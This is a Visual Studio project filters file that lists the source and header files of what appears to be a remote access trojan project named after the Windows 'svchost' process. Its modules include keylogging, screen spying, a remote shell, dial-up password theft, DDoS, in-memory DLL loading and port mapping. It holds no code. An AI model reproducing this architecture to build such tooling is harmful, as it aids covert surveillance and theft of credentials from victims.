<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{d7e71518-eeb1-480c-9d16-aff28154a28b}</UniqueIdentifier>
      <Extensions>cpp;c;csvchost;rc;def;r;odl;idl;hpj;bat</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{f8bcc41b-16ad-4709-8a15-d3f1b9f418a7}</UniqueIdentifier>
      <Extensions>h;hpp;hsvchost;hm;inl</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{fc731035-0597-4a57-8aa3-9f6790e387c5}</UniqueIdentifier>
      <Extensions>ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="common\Buffer.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="ClientSocket.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\ddos.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\Dialupass.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\DllManager.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\FileManager.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\install.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\KernelManager.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\KeyboardManager.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\Manager.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\RegEditEx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\RegeditOpt.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\Registry.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\RegManager.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\ScreenManager.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\ScreenSpy.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\ShellManager.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="svchost.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\SysInfo.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\SystemManager.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\until.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="common\ZXPortMap.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ResourceCompile Include="svchost.rc">
      <Filter>Source Files</Filter>
    </ResourceCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="common\Buffer.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="ClientSocket.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\ddos.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\decode.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\Dialupass.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\DllManager.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\filemanager.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\install.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\KernelManager.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\KeyboardManager.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\login.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\loop.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\..\common\macros.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\Manager.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\MemLoadDll.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\Proxy.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\RegEditEx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\RegeditOpt.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\Registry.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\RegManager.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\ScreenManager.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\ScreenSpy.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\ShellManager.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\SysInfo.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\SystemManager.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\until.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="common\ZXPortMap.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <Text Include="ReadMe.txt" />
  </ItemGroup>
  <ItemGroup>
    <CustomBuild Include="html1.htm" />
  </ItemGroup>
</Project>